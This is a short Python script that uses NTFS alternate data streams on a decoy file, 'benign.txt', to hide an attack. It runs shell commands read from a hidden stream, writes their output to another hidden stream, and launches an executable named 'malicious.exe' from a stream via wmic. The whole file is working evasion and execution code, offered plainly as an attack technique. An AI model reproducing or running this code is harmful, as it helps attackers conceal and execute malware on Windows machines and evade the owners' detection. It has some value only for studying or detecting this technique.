import os
from pkgutil import extend_path


def build_ads_filename(filename, streamname):
    return filename + ":" + streamname

decoy = "benign.txt"
resultfile = build_ads_filename(decoy, "results.txt")
commandfile = build_ads_filename(decoy, "commands.txt")

# run commands from file
with open(commandfile, "r") as command:
    for line in command:
        str(os.system(line + " >> " + resultfile))

# run the executable
exefile = "malicious.exe"
exepath = os.path.join(os.getcwd(), build_ads_filename(decoy,exefile))
os.system("wmic process call create " + exepath)